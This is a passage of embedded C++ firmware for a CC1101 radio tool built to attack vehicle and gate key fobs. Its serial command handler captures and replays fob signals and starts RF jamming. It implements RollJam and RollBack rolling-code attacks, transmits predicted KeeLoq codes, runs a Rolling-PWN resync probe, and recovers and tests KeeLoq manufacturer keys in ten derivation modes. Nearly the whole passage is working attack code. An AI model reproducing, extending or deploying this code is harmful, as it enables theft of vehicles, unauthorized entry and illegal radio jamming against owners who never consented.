    // Optional capture range: { "cmd":"capture", "f_min":311, "f_max":316 }
    if(jcmd.containsKey("f_min")){float v=(float)jcmd["f_min"];if(v>=100&&v<=950)capRangeMin=v;}
    if(jcmd.containsKey("f_max")){float v=(float)jcmd["f_max"];if(v>=100&&v<=950)capRangeMax=v;}
    // If range set but no specific freq, tune to first in-range frequency
    if(capRangeMin>0&&!jcmd.containsKey("f")){
      for(int i=0;i<N_FREQS;i++){
        if(FOB_FREQS[i]>=capRangeMin&&FOB_FREQS[i]<=capRangeMax){curFreq=FOB_FREQS[i];break;}
      }
    }
    // Optional timeout override: { "cmd":"capture", "t":30000 } (ms, 1000–60000)
    uint16_t capT=CAP_TIMEOUT_MS;
    if(jcmd.containsKey("t")){
      int tt=(int)jcmd["t"];
      if(tt>=1000&&tt<=60000) capT=(uint16_t)tt;
    }
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_setFreq(curFreq); cc_strobe(0x34);
    SPI.endTransaction();
    bool ok=captureSignal(capT);
    if(ok) serialEmit(decodeSignal());
    else serialEmit("{\"cmd\":\"capture\",\"error\":\"no-signal\"}");
    scanActive=wasScan;
  }
  else if(op=="decode"){
    serialEmit(lastDecode.length()>2?lastDecode:"{\"cmd\":\"decode\",\"error\":\"no-data\"}");
  }
    else if(op=="replay"){
      // Pause the sweep across the transmission, as replay_seq and dual_band_replay already
      // do. scanTick() runs after handleSerial() in loop() and retunes the chip on its own
      // schedule, so without this a sweep tick can retune the CC1101 out from under the burst.
      bool wasScanRp=scanActive; scanActive=false;
      bool ok=replayRaw(rfFreq, rfBuf, rfLen, 3, rfStartHigh);
      scanActive=wasScanRp;
      serialEmit(String("{\"cmd\":\"replay\",\"ok\":")+( ok?"true":"false")+"}");
    }
  else if(op=="replay_predicted"){
    serialEmit(replayPredicted());
  }
  else if(op=="lib_replay"){
    // Single predicted frame — same logic as /api/lib_replay HTTP endpoint
    String lproto=jcmd["proto"]|"";
    uint32_t lsn=(uint32_t)(unsigned long)jcmd["sn"];
    int32_t lctr=(int32_t)(long)jcmd["ctr"];
    int32_t ldelta=(int32_t)(long)jcmd["delta"]; if(ldelta==0) ldelta=1;
    float lmhz=jcmd["mhz"]|433.92f;
    int lte=(int)jcmd["te"]|360;
    uint8_t lctrl=(uint8_t)(int)jcmd["ctrl"];
    bool wasScan=scanActive; scanActive=false;
    serialEmit(replayLibEntry(lproto,lsn,lctr,ldelta,lmhz,lte,lctrl));
    scanActive=wasScan;
  }
  else if(op=="replay_seq"){
    String rproto=jcmd["proto"]|"";
    uint32_t rsn=(uint32_t)(unsigned long)jcmd["sn"];
    int32_t rctr=(int32_t)(long)jcmd["ctr"];
    int32_t rdelta=(int32_t)(long)jcmd["delta"];
    if(rdelta==0) rdelta=1;
    float rmhz=jcmd["mhz"]|433.92f;
    int rte=(int)jcmd["te"]|360;
    uint8_t rctrl=(uint8_t)(int)jcmd["ctrl"];
    int rn=max(1,min((int)(jcmd["n"]|50),512));
    bool wasScan=scanActive; scanActive=false;
    replaySeq(rproto,rsn,rctr,rdelta,rmhz,rte,rctrl,rn);
    scanActive=wasScan;
  }
  else if(op=="replay_stop"||op=="replay_next"){
    // Consumed by replaySeqWait() during an active sequence.
    // If we get here, no sequence is running — just ack.
    serialEmit("{\"cmd\":\""+op+"\",\"ok\":true,\"note\":\"no active sequence\"}");
  }
  else if(op=="dual_band_replay"){
    // Retransmit Ch A (rfBuf @ rfFreq) then immediately hop to Ch B (rfBufB @ rfFreqB).
    // Mimics the simultaneous dual-burst the OEM fob produces on a single press.
    // The CC1101 PLL relocks in ~150 µs between channels.
    // Rolling-code Ch B frames replay raw (each frame is single-use by the ECU).
    float chaMhz=jcmd["ch_a_mhz"]|rfFreq;
    float chbMhz=jcmd["ch_b_mhz"]|rfFreqB;
    int reps=max(1,min((int)(jcmd["reps"]|3),5));
    bool wasScan=scanActive; scanActive=false;
    bool chaOk=false,chbOk=false;
    if(rfLen>0){  chaOk=replayRaw(chaMhz, rfBuf, rfLen, reps, rfStartHigh);  delay(5); }
    if(rfLenB>0){ chbOk=replayRaw(chbMhz, rfBufB, rfLenB, reps, rfStartHighB); }
    scanActive=wasScan;
    serialEmit(String("{\"cmd\":\"dual_band_replay\",\"ok\":")+
      ((chaOk||chbOk)?"true":"false")+
      ",\"ch_a_ok\":"+String(chaOk?"true":"false")+
      ",\"ch_a_mhz\":"+String(chaMhz,2)+
      ",\"ch_b_ok\":"+String(chbOk?"true":"false")+
      ",\"ch_b_mhz\":"+String(rfLenB>0?chbMhz:0.0f,2)+
      ",\"ch_b_ready\":"+String(rfLenB>0?"true":"false")+"}");
  }
  // ── FOBback (RollBack) serial/WS commands ─────────────────────────────
  else if(op=="fbk_arm"){
    fbkArmed=true; fbkCount=0;
    serialEmit("{\"cmd\":\"fbk_arm\",\"ok\":true}");
  }
  else if(op=="fbk_disarm"){
    fbkArmed=false; fbkCount=0;
    serialEmit("{\"cmd\":\"fbk_disarm\",\"ok\":true}");
  }
  // Serial mirror of /api/fbk_status. Added for the bench pass: the whole C1/C2
  // bench runs over USB serial, and without this the trim state was only visible
  // by calling rollback_arm and reading the refusal.
  else if(op=="fbk_status"){
    String j="{\"cmd\":\"fbk_status\",\"armed\":"+String(fbkArmed?"true":"false")+
             ",\"n\":"+String(fbkCount)+",\"sigs\":[";
    for(int i=0;i<fbkCount;i++){
      if(i>0) j+=",";
      j+="{\"idx\":"+String(i)+",\"freq\":"+String(fbkBuf[i].freq,2)+
         ",\"len\":"+String(fbkBuf[i].len)+
         ",\"trimmed\":"+(fbkBuf[i].trimmed?"true":"false")+
         ",\"has_ctr\":"+(fbkBuf[i].hasCtr?"true":"false")+"}";
    }
    j+="]}";
    serialEmit(j);
  }
  else if(op=="fbk_replay"){
    int n=max(0,(int)(jcmd["n"]|0));
    if(n>=fbkCount){
      serialEmit("{\"cmd\":\"fbk_replay\",\"ok\":false,\"error\":\"idx-out-of-range\",\"count\":"+String(fbkCount)+"}");
      } else {
        int gap=(int)(jcmd["gap_ms"]|0); if(gap>0&&gap<=3000) delay(gap);
        bool wasScanFb=scanActive; scanActive=false;
        bool ok=replayRaw(fbkBuf[n].freq, fbkBuf[n].w, fbkBuf[n].len, 3, fbkBuf[n].sh);
        scanActive=wasScanFb;
        serialEmit(String("{\"cmd\":\"fbk_replay\",\"ok\":")+( ok?"true":"false")+
        ",\"idx\":"+String(n)+",\"freq\":"+String(fbkBuf[n].freq,2)+"}");
    }
  }
  // Serial mirror of /api/decode — the last decode, including fail_reason. The
  // bench is serial-only, and this is how a captured fob is identified (proto,
  // sn, ctr) without a browser.
  else if(op=="decode"){
    serialEmit(String("{\"cmd\":\"decode\",\"result\":")+
      (lastDecode.length()>2?lastDecode:String("{\"error\":\"no-data\"}"))+"}");
  }
  // ── Jam (serial mirrors; previously HTTP-only, so a serial jam_start was
  //    silently ignored and looked like it had worked) ─────────────────────
  else if(op=="jam_start"){
    float f=jcmd.containsKey("freq")?(float)jcmd["freq"]:curFreq;
    startJam(f);
    serialEmit(String("{\"cmd\":\"jam_start\",\"ok\":")+(jamActive?"true":"false")+
      ",\"freq\":"+String(jamFreq,3)+",\"path\":\""+String(jamUseFifo?"fifo":"gdo0")+"\"}");
  }
  else if(op=="jam_stop"){
    stopJam();
    serialEmit(String("{\"cmd\":\"jam_stop\",\"ok\":true,\"active\":")+
      (jamActive?"true":"false")+"}");
  }
  else if(op=="jam_status"){
    int marc=-1, txb=-1;
    if(jamActive){
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      marc=cc_readStatus(0x35)&0x1F;
      txb=cc_readStatus(0x3A);
      SPI.endTransaction();
    }
    serialEmit(String("{\"cmd\":\"jam_status\",\"active\":")+
      (jamActive?"true":"false")+
      ",\"freq\":"+String(jamFreq,3)+
      ",\"path\":\""+String(jamUseFifo?"fifo":"gdo0")+"\","+
      "\"marcstate\":"+String(marc)+",\"txbytes\":"+String(txb&0x7F)+
      ",\"underflow\":"+String((txb>=0&&(txb&0x80))?"true":"false")+
      // Cumulative, since the jam started. The instantaneous bit above says nothing about
      // whether the carrier gapped earlier in the press -- this is the number C1 needs.
      ",\"underruns\":"+String(jamUnderruns)+
      ",\"max_gap_ms\":"+String(jamMaxGapMs)+
      ",\"note\":\""+String(!jamActive?"no jam running"
        : ((marc==19||marc==20)?"PA in TX: carrier live"
           : (marc==22?"TX FIFO underflowed: carrier has gaps"
              : String("MARCSTATE ")+String(marc)+" is not TX (19,20): carrier is NOT live")))+"\"}");
  }
  // {"cmd":"fbk_import","freq":315.0,"pulses":"132,491,..."} — serial form of the
  // import, because the bench runs over USB serial with no browser.
  else if(op=="fbk_import"){
    float im=(float)(jcmd["freq"]|315.0f);
    String csv=jcmd["pulses"]|"";
    uint16_t* ip=impStage; int ic=0;   // shared body stage
    int st2=0;
    while(st2<(int)csv.length() && ic<SUB_REPLAY_MAX_PULSES){
      int cm=csv.indexOf(',',st2);
      String tok=(cm<0)?csv.substring(st2):csv.substring(st2,cm);
      tok.trim();
      if(tok.length()) ip[ic++]=(uint16_t)tok.toInt();
      if(cm<0) break;
      st2=cm+1;
    }
    String err;
    bool ok=fbkImportFrame(ip,ic,im,true,err);
    String body="{\"cmd\":\"fbk_import\",\"ok\":"+String(ok?"true":"false")+
      ",\"pulses\":"+String(ic)+",\"searched\":"+String(ic)+
      ",\"held\":"+String(fbkCount)+",\"max\":"+String(FBK_MAX);
    if(!ok) body+=",\"reason\":\""+err+"\"";
    else {
      FbkEntry& e=fbkBuf[fbkCount-1];
      body+=",\"idx\":"+String(fbkCount-1)+",\"len\":"+String(e.len)+
            ",\"trimmed\":"+String(e.trimmed?"true":"false")+
            ",\"has_ctr\":"+String(e.hasCtr?"true":"false")+
            ",\"ctr\":"+String(e.ctr);
    }
    body+=",\"anchor_index\":"+String(impLastAnchor)+
          ",\"payload_pulses\":"+String(fbkCount>0?fbkBuf[fbkCount-1].len:0)+"}";
    serialEmit(body);
  }
  // ── C2 RollBack (serial mirrors of the HTTP routes) ────────────────────
  else if(op=="rollback_arm"){
    bool ok=rbArm();
    // Mirror the HTTP route's `reason` here too. The bench drives the card over
    // serial, and the reason is the whole point of the gate: without it a refusal
    // is indistinguishable from a no-op, which is the failure mode research/12 §3
    // P1 exists to remove.
    String reason="";
    if(!ok){
      if(fbkCount<2)                                  reason="need-2-codes";
      else if(!fbkBuf[0].trimmed||!fbkBuf[1].trimmed)  reason="untrimmed-block";
      else if(fbkCtrOrder()<0)                        reason="same-or-backward-code";
      else                                            reason="no-distinct-codes";
    }
    serialEmit(String("{\"cmd\":\"rollback_arm\",\"ok\":")+(ok?"true":"false")+
      ",\"armed\":"+(rbArmed?"true":"false")+",\"codes\":"+String(fbkCount)+
      ",\"reason\":\""+reason+"\"}");
  }
  else if(op=="rollback_fire"){
    uint32_t g=(uint32_t)((int)(jcmd["gap_ms"]|0));
    bool ok=rbStart(g>0?g:rbGapMs);
    serialEmit(String("{\"cmd\":\"rollback_fire\",\"ok\":")+(ok?"true":"false")+
      ",\"gap_ms\":"+String(rbGapMs)+",\"codes\":"+String(fbkCount)+"}");
  }
  // ── C1 RollJam (serial mirrors of the HTTP routes) ──────────────────────
  else if(op=="rolljam_arm"){
    float f=jcmd.containsKey("freq")?(float)jcmd["freq"]:curFreq;
    float off=jcmd.containsKey("offset_khz")?(float)jcmd["offset_khz"]:150.0f;
    bool ok=rjArm(f,off);
    serialEmit(String("{\"cmd\":\"rolljam_arm\",\"ok\":")+(ok?"true":"false")+
      ",\"armed\":"+(rjArmed?"true":"false")+",\"freq\":"+String(rjFreq,3)+"}");
  }
  else if(op=="rolljam_start"){
    bool ok=rjStart();
    serialEmit(String("{\"cmd\":\"rolljam_start\",\"ok\":")+(ok?"true":"false")+ "}");
  }
  else if(op=="rolljam_abort"){
    if(jamActive) stopJam();
    setLed(0,150,65);
    rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"user\"}";
    rjReset();
    serialEmit("{\"cmd\":\"rolljam_abort\",\"ok\":true}");
  }
  else if(op=="rolljam_status"){
    serialEmit("{\"cmd\":\"rolljam_status\",\"state\":"+String((int)rjState)+
      ",\"armed\":"+(rjArmed?"true":"false")+
      ",\"jam\":"+(jamActive?"true":"false")+
      ",\"len1\":"+String(rjLen1)+",\"len2\":"+String(rjLen2)+
      ",\"trim1\":"+(rjTrim1?"true":"false")+",\"trim2\":"+(rjTrim2?"true":"false")+
      ",\"last\":"+rjLastJson+"}");
  }
  else if(op=="rolljam_replay"){
    if(rjLen2<8){
      serialEmit("{\"cmd\":\"rolljam_replay\",\"ok\":false,\"error\":\"no-held-code\"}");
    } else {
      bool wasScanRj=scanActive; scanActive=false;
      bool ok=replayRaw(rjFreq, rjBuf2, rjLen2, 3, rjSh2);
      scanActive=wasScanRj;
      serialEmit(String("{\"cmd\":\"rolljam_replay\",\"ok\":")+(ok?"true":"false")+
        ",\"len\":"+String(rjLen2)+"}");
    }
  }
  else if(op=="rollback_status"){
    const char* ph=(rbPhase==RB_GAP)?"gap":((rbPhase==RB_DONE)?"done":"idle");
    serialEmit(String("{\"cmd\":\"rollback_status\",\"phase\":\"")+ph+
      "\",\"armed\":"+(rbArmed?"true":"false")+",\"codes\":"+String(fbkCount)+
      ",\"gap_ms\":"+String(rbGapMs)+",\"last\":"+rbLastJson+"}");
  }
  else if(op=="scan"){
    String ss=scanStatsJson();
    serialEmit("{\"cmd\":\"scan\","+ss.substring(1));
  }
  else if(op=="scan_toggle"){
    scanActive=!scanActive;
    scanUserPaused=!scanActive; // track explicit user intent
    if(scanActive){stickyFreq=0.0f;stickyPrio=0;} // reset linger on explicit restart
    serialEmit(String("{\"cmd\":\"scan_toggle\",\"active\":")+String(scanActive?"true":"false")+"}");
  }
  else if(op=="sweep_range"){
    if((jcmd["reset"]|0)==1){
      sweepMin=0.0f; sweepMax=9999.0f;
    } else {
      float fmin=jcmd["f_min"]|0.0f;
      float fmax=jcmd["f_max"]|0.0f;
      if(fmin>=100&&fmin<=950) sweepMin=fmin;
      if(fmax>=100&&fmax<=950) sweepMax=fmax;
    }
    swp_save(); // persist so reboot restores the same band
    serialEmit("{\"cmd\":\"sweep_range\",\"ok\":true,\"sweep_min\":"+String(sweepMin,2)+",\"sweep_max\":"+String(sweepMax,2)+"}");
  }
  else if(op=="cap_range"){
    if((jcmd["reset"]|0)==1){
      capRangeMin=0.0f; capRangeMax=9999.0f;
    } else {
      float fmin=jcmd["f_min"]|0.0f;
      float fmax=jcmd["f_max"]|0.0f;
      if(fmin>=100&&fmin<=950) capRangeMin=fmin;
      if(fmax>=100&&fmax<=950) capRangeMax=fmax;
    }
    swp_save(); // persist alongside sweep range so FOBclone/FOBcatch arm survives reboots
    serialEmit("{\"cmd\":\"cap_range\",\"ok\":true,\"cap_range_min\":"+String(capRangeMin,2)+",\"cap_range_max\":"+String(capRangeMax,2)+"}");
  }
  else if(op=="setfreq"){
    // Accept f (controls-panel), mhz (frequency-scanner custom), or idx (frequency-scanner preset).
    // Also pins sweepMin/sweepMax to f±0.15 MHz so scanTick() stays on this channel (v3.50).
    float f=jcmd["f"]|0.0f;
    if(f<1.0f) f=jcmd["mhz"]|0.0f;
    int idx=jcmd["idx"]|(-1);
    if(f<1.0f&&idx>=0&&idx<N_FREQS) f=FOB_FREQS[idx];
    if(f>200&&f<950){
      curFreq=f;
      sweepMin=f-0.15f; sweepMax=f+0.15f;
      swp_save();
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_setFreq(f); cc_strobe(0x34);
      SPI.endTransaction();
    }
    serialEmit("{\"cmd\":\"setfreq\",\"freq\":"+String(curFreq,2)+
      ",\"sweep_min\":"+String(sweepMin,2)+",\"sweep_max\":"+String(sweepMax,2)+"}");
  }
  // The dashboard sends "save_decoded" (its own name for this action); the firmware
  // historically only exposed it as "save" on serial and /api/save_decoded on HTTP.
  // Same handler, so accept both names rather than teaching the UI a second name.
  else if(op=="save"||op=="save_decoded"){
    String n=jcmd["n"]|""; if(n.length()==0) n=autoName();
    int s=keySave(n,rfFreq,rfBuf,rfLen,rfStartHigh);
    serialEmit(String("{\"cmd\":\"")+op+"\",\"ok\":"+(s>=0?String("true"):String("false"))+
      ",\"slot\":"+String(s)+",\"name\":\""+n+"\"}");
  }
  else if(op=="keys"){
    serialEmit("{\"cmd\":\"keys\",\"keys\":"+keysJson()+"}");
  }
  else if(op=="play_key"){
    int idx=jcmd["i"]|(-1);
    if(idx<0||idx>=MAX_KEYS||!keys[idx].used){
      serialEmit("{\"cmd\":\"play_key\",\"ok\":false}");
    } else {
      bool wasScanPk=scanActive; scanActive=false;
      bool ok=replayRaw(keys[idx].freq, keys[idx].data, keys[idx].len, 3, keys[idx].sh);
      scanActive=wasScanPk;
      serialEmit(String("{\"cmd\":\"play_key\",\"ok\":")+( ok?"true":"false")+",\"i\":"+String(idx)+"}");
    }
  }
  else if(op=="del_key"){
    int idx=jcmd["i"]|(-1);
    if(idx>=0&&idx<MAX_KEYS) keys[idx].used=false;
    serialEmit("{\"cmd\":\"del_key\",\"ok\":true}");
  }
  // { cmd:"fast_hop", en:1|0 [, dwell:80] }
  // Toggle fast-hop scan mode: uniform short dwell cycles the band faster.
  else if(op=="fast_hop"){
    bool en=jcmd.containsKey("en")?((int)(jcmd["en"]|0)!=0):!fastHopActive;
    if(jcmd.containsKey("dwell")){int d=jcmd["dwell"]|80;if(d>=30&&d<=2000)fastHopDwellMs=(uint16_t)d;}
    fastHopActive=en;
    serialEmit("{\"cmd\":\"fast_hop\",\"ok\":true,\"fast_hop\":"+String(en?"true":"false")+",\"dwell\":"+String(fastHopDwellMs)+"}");
  }
  // { cmd:"resync_probe", proto:"KeeLoq", sn:N, ctr:N, delta:N, mhz:F, te:N, ctrl:N, n:16 }
  // Transmits n consecutive predicted codes to probe Honda-style counter-desync
  // (Rolling-PWN). Delegates to replaySeq() — the same path replay_seq uses.
  else if(op=="resync_probe"){
    String proto=jcmd["proto"]|"KeeLoq";
    uint32_t sn=(uint32_t)(unsigned long)jcmd["sn"];
    int32_t ctr=(int32_t)(long)jcmd["ctr"];
    int32_t delta=(int32_t)(long)jcmd["delta"]; if(delta==0) delta=1;
    float mhz=jcmd["mhz"]|433.92f;
    int te=(int)jcmd["te"]|360;
    uint8_t ctrl=(uint8_t)(int)jcmd["ctrl"];
    int n=max(1,min((int)(jcmd["n"]|16),64));
    bool wasScan=scanActive; scanActive=false;
    replaySeq(proto,sn,ctr,delta,mhz,te,ctrl,n);
    scanActive=wasScan;
  }
  // ─── Manufacturer-key management ─────────────────────────────────────
  else if(op=="key_add"){
    String name = jcmd["n"] | "key";
    String khex = jcmd["k"] | "";
    uint8_t fam = (uint8_t)(int)(jcmd["family"] | 0);
    uint64_t k = 0;
    if(!ks_parseHex64(khex.c_str(), k)){
      serialEmit("{\"cmd\":\"key_add\",\"ok\":false,\"error\":\"bad-hex\"}");
    } else {
      int slot = ks_addUserKey(name.c_str(), k, fam);
      if(slot < 0){
        serialEmit("{\"cmd\":\"key_add\",\"ok\":false,\"error\":\"full\"}");
      } else {
        serialEmit("{\"cmd\":\"key_add\",\"ok\":true,\"slot\":" + String(slot) + "}");
      }
    }
  }
  else if(op=="key_list"){
    serialEmit("{\"cmd\":\"key_list\",\"keys\":" + ks_userKeysJson() + "}");
  }
  else if(op=="key_del"){
    int idx = jcmd["i"] | (-1);
    bool ok = ks_delUserKey(idx);
    serialEmit("{\"cmd\":\"key_del\",\"ok\":" + String(ok?"true":"false") + ",\"i\":" + String(idx) + "}");
  }
  else if(op=="key_clear"){
    // Accidental-wipe guard: require an explicit confirm phrase before erasing
    // all saved manufacturer keys.  {"cmd":"key_clear","confirm":"ERASE"}
    String kcConfirm = jcmd["confirm"] | "";
    if(kcConfirm != "ERASE"){
      serialEmit("{\"cmd\":\"key_clear\",\"ok\":false,\"error\":\"confirm-required\",\"note\":\"send confirm:\\\"ERASE\\\" to wipe all keys\"}");
    } else {
      ks_clearUserKeys();
      serialEmit("{\"cmd\":\"key_clear\",\"ok\":true}");
    }
  }
  else if(op=="set_filter"){
    bool clr=jcmd["clear"]|false;
    if(clr){ filterProto=""; filterVehicle=""; }
    else {
      String fp=jcmd["proto"]|""; String fv=jcmd["vehicle"]|"";
      if(fp.length()>0){ filterProto=fp; filterVehicle=""; }
      if(fv.length()>0){ filterVehicle=fv; filterProto=""; }
    }
    serialEmit("{\"cmd\":\"set_filter\",\"ok\":true,\"filter_proto\":\""+filterProto+"\",\"filter_vehicle\":\""+filterVehicle+"\"}");
  }
  else if(op=="get_filter"){
    serialEmit("{\"cmd\":\"get_filter\",\"filter_proto\":\""+filterProto+"\",\"filter_vehicle\":\""+filterVehicle+"\"}");
  }
  // ─── Manufacturer-key recovery (wordlist + monotonicity check) ──────
  else if(op=="key_recover_start"){
    uint8_t n = (uint8_t)(int)(jcmd["n"] | 3);
    ks_krStart(n);
    serialEmit(String("{\"cmd\":\"key_recover_start\",\"ok\":true,\"need\":") + n + "}");
  }
  else if(op=="key_recover_cancel"){
    ks_krCancel();
    serialEmit("{\"cmd\":\"key_recover_cancel\",\"ok\":true}");
  }
  // ── Offline key recovery from stored library frames ──────────────────────
  // {"cmd":"key_recover_offline","hops":["0x…","0x…",…],"sn":12345678,"btn":1}
  // Skips live RF capture — runs the exhaustive key search against stored hops.
  // Emits the same key_recover_* events as the live path so the UI needs no changes.
  else if(op=="key_recover_offline"){
    JsonArray hopArr=jcmd["hops"].as<JsonArray>();
    if(!hopArr||hopArr.size()<2){
      serialEmit("{\"cmd\":\"key_recover_offline\",\"ok\":false,\"error\":\"need-min-2-hops\"}");
    } else {
      ks_krCancel();
      uint32_t sn32=(uint32_t)(long)(jcmd["sn"]|0L);
      uint8_t btn8=(uint8_t)(int)(jcmd["btn"]|0);
      uint8_t n=(uint8_t)min((int)hopArr.size(),(int)KR_MAX_FRAMES);
      KR.got=0; KR.need=n; KR.startedMs=millis();
      for(uint8_t i=0;i<n;i++){
        const char* hs=hopArr[i]|"";
        uint64_t tmp=0; ks_parseHex64(hs,tmp);
        KLFrame fr; fr.sn=sn32; fr.hop=(uint32_t)tmp; fr.btn=btn8; fr.sts=0; fr.rawCtr=0;
        KR.frames[KR.got++]=fr;
      }
      serialEmit(String("{\"event\":\"key_recover_started\",\"need\":")+n+",\"offline\":true}");
      for(uint8_t i=0;i<KR.got;i++){
        char sh[12]; snprintf(sh,12,"0x%08lX",(unsigned long)KR.frames[i].hop);
        serialEmit(String("{\"event\":\"key_recover_progress\",\"got\":")+(i+1)
          +",\"need\":"+n+",\"sn\":"+String((unsigned long)sn32)
          +",\"btn\":"+btn8+",\"hop\":\""+sh+"\"}");
      }
      ks_krAnalyze();
      serialEmit("{\"cmd\":\"key_recover_offline\",\"ok\":true}");
    }
  }
  else if(op=="key_recover_status"){
    serialEmit(String("{\"cmd\":\"key_recover_status\",\"active\":")
               + (KR.active?"true":"false")
               + ",\"got\":" + KR.got + ",\"need\":" + KR.need + "}");
  }
  // ── key_probe ─────────────────────────────────────────────────────────
  // Test a candidate 64-bit manufacturer key against the last 2-5 KeeLoq
  // frames seen (from any fob, regardless of whether key_recover is active).
  // All 10 derivation modes are tried automatically.
  //
  // Usage: {"cmd":"key_probe","key":"XXXXXXXXXXXXXXXX","name":"MyFobLabel"}
  //
  // On success, emits the device key. That value is what add_user_key stores.
  else if(op=="key_probe"){
    if(KL_RECENT_CNT < 2){
      serialEmit("{\"cmd\":\"key_probe\",\"ok\":false,\"reason\":\"need-2-keeloq-frames\","
                 "\"hint\":\"Press your fob 2-5 times while the scanner is active first\"}");
    } else {
      String kstr = jcmd["key"]|"";
      uint64_t probeMfrKey = 0;
      if(!ks_parseHex64(kstr.c_str(), probeMfrKey)){
        serialEmit("{\"cmd\":\"key_probe\",\"ok\":false,\"reason\":\"invalid-key-hex\","
                   "\"hint\":\"Supply a 16-character hex string, e.g. FEDCBA9876543210\"}");
      } else {
        // Temporarily substitute recent frames as the KR session buffer,
        // run all 10 derivation modes, then restore the original session.
        KRSession saved = KR;
        KR = {};
        KR.active = true;
        KR.got    = KL_RECENT_CNT;
        KR.need   = KL_RECENT_CNT;
        uint8_t start = (KL_RECENT_HEAD + KL_RECENT_MAX - KL_RECENT_CNT) % KL_RECENT_MAX;
        for(uint8_t i=0;i<KL_RECENT_CNT;i++)
          KR.frames[i] = KL_RECENT_BUF[(start+i)%KL_RECENT_MAX];
        // Compute SN derivatives for this fob
        uint16_t pLo = (uint16_t)(KR.frames[0].sn & 0xFFFF);
        uint16_t pHi = (uint16_t)(KR.frames[0].sn >> 16);
        uint16_t pXor = pLo ^ pHi;
        uint16_t pBsLo = ((pLo>>8)|(pLo<<8))&0xFFFF;
        uint16_t pBsHi = ((pHi>>8)|(pHi<<8))&0xFFFF;
        uint64_t bestProbeDev=0; int bestProbeScore=0;
        String bestProbeMode=""; int32_t bestProbeMD=0;
        // Try all 10 modes inline (no macro here, plain blocks)
        auto tryProbeMode=[&](uint64_t dk,const char* mn){
          uint32_t cc[KR_MAX_FRAMES]; uint8_t bb[KR_MAX_FRAMES]; int32_t md=0;
          int s=ks_krScore(dk,cc,bb,&md);
          if(s>bestProbeScore){bestProbeScore=s;bestProbeDev=dk;bestProbeMode=mn;bestProbeMD=md;}
        };
        tryProbeMode(probeMfrKey,"simple");
        { uint32_t dL=ks_klEncrypt((uint32_t)pLo,probeMfrKey);
          uint32_t dH=ks_klEncrypt((uint32_t)pHi|0x20000000UL,probeMfrKey);
          tryProbeMode(((uint64_t)dH<<32)|(uint64_t)dL,"normal"); }
        { uint32_t xL=ks_klEncrypt((uint32_t)pXor,probeMfrKey);
          uint32_t xH=ks_klEncrypt((uint32_t)pXor|0x60000000UL,probeMfrKey);
          tryProbeMode(((uint64_t)xH<<32)|(uint64_t)xL,"xor-seed"); }
        { uint32_t sL=ks_klEncrypt((uint32_t)pLo,probeMfrKey);
          uint32_t sH=ks_klEncrypt((uint32_t)pHi|0x40000000UL,probeMfrKey);
          tryProbeMode(((uint64_t)sH<<32)|(uint64_t)sL,"secure"); }
        { uint32_t f32=ks_klEncrypt(KR.frames[0].sn&0x0FFFFFFFUL,probeMfrKey);
          tryProbeMode(((uint64_t)f32<<32)|(uint64_t)f32,"full-sn"); }
        { uint32_t dL=ks_klEncrypt((uint32_t)pLo,probeMfrKey);
          uint32_t dH=ks_klEncrypt((uint32_t)pHi|0x20000000UL,probeMfrKey);
          tryProbeMode(~(((uint64_t)dH<<32)|(uint64_t)dL),"normal-inv"); }
        { uint32_t dL=ks_klEncrypt((uint32_t)pBsLo,probeMfrKey);
          uint32_t dH=ks_klEncrypt((uint32_t)pBsHi|0x20000000UL,probeMfrKey);
          tryProbeMode(((uint64_t)dH<<32)|(uint64_t)dL,"byteswap-sn"); }
        { uint64_t k32=(uint64_t)(uint32_t)probeMfrKey;
          tryProbeMode((k32<<32)|k32,"half-mirror"); }
        // mode 9: standard DECRYPT form (Microchip TB003 / AN742)
        { uint32_t sn28r=KR.frames[0].sn&0x0FFFFFFFUL;
          uint32_t d9L=ks_klDecrypt(sn28r|0x20000000UL,probeMfrKey);
          uint32_t d9H=ks_klDecrypt(sn28r|0x60000000UL,probeMfrKey);
          tryProbeMode(((uint64_t)d9H<<32)|(uint64_t)d9L,"normal-dec"); }
        // mode 10: Magic XOR Type-1 (Beninca + compatibles)
        { uint32_t sn28x=KR.frames[0].sn&0x0FFFFFFFUL;
          tryProbeMode((((uint64_t)sn28x<<32)|(uint64_t)sn28x)^probeMfrKey,"xor-type1"); }
        KR = saved; // restore session
        int needS = 3 + 3*(KL_RECENT_CNT-1);
        String pname = jcmd["name"]|"probe";
        String out = String("{\"cmd\":\"key_probe\",\"frames\":") + KL_RECENT_CNT;
        if(bestProbeScore >= needS){
          char mkh[20]; snprintf(mkh,20,"%08lX%08lX",
            (unsigned long)(probeMfrKey>>32),(unsigned long)(probeMfrKey&0xFFFFFFFFUL));
          char dkh2[20]; snprintf(dkh2,20,"%08lX%08lX",
            (unsigned long)(bestProbeDev>>32),(unsigned long)(bestProbeDev&0xFFFFFFFFUL));
          const char* conf=(KL_RECENT_CNT>=3&&bestProbeMD<=8)?"high":
                           (bestProbeMD<=16||KL_RECENT_CNT>=3)?"medium":"low";
          out += ",\"ok\":true,\"name\":\"" + pname + "\"";
          out += ",\"mfr_key\":\"" + String(mkh) + "\"";
          out += ",\"device_key\":\"" + String(dkh2) + "\"";
          out += ",\"mode\":\"" + bestProbeMode + "\",\"score\":" + bestProbeScore;
          out += ",\"max_delta\":" + String((long)bestProbeMD);
          out += ",\"confidence\":\"" + String(conf) + "\"";
          out += ",\"save_hint\":\"{\\\"cmd\\\":\\\"add_user_key\\\",\\\"n\\\":\\\"" + pname
                 + "\\\",\\\"k\\\":\\\"" + String(dkh2) + "\\\"}\"";
        } else {
          out += String(",\"ok\":false,\"score\":") + bestProbeScore +
                 ",\"needed\":" + String(needS) +
                 ",\"hint\":\"Key did not match in any of the 10 derivation modes. "
                 "Try more frames or verify the key value.\"}";
        }
        out += "}";
        serialEmit(out);
      }
    }
  }
  // ── squelch ───────────────────────────────────────────────────────────
  // Adjust the auto-capture sensitivity threshold at runtime.
  // Usage: {"cmd":"squelch","dbm":-60}
  //   dbm: integer, typical range -50 (quiet) to -80 (very sensitive).
  //   Default is -65. Raise toward -55 if nearby 433 MHz devices
  //   (weather stations, tire-pressure sensors, wireless doorbells) are
  //   triggering false auto-captures. Lower toward -75 for distant fobs.
  else if(op=="squelch"){
    int dbm = jcmd.containsKey("dbm") ? (int)jcmd["dbm"] : autoCapDbm;
    if(dbm > -40) dbm = -40;
